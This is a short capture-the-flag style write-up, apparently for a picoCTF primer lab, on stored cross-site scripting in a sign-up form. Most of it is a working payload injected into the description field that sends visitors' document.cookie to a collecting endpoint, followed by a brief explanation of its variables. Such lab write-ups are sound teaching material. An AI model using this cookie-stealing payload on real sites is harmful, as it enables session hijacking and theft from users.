# Cross-Site Scripting

## Target
https://primer.picoctf.org/vuln/web/sign_up.php

## Environment
Table with categories: name, description

## Solution
Put this in description

```
<script src="https://code.jquery.com/jquery-3.4.1.min.js"> </script>
<script>
$.get(
    "https://primer.picoctf.org/vuln/web/insert.php",
    {cookie : document.cookie, hackername : 'Hacker'},
    function(data) {
        alert("I just stole the cookie!");
    }
);
</script>
```

That service receives two variables: "cookie" and "hackername". The value of the variable cookie will be "document.cookie". Using document.cookie you access the cookies from JavaScript, so that should contain the cookie you want to steal. The variable hackername simply has a name assigned. 
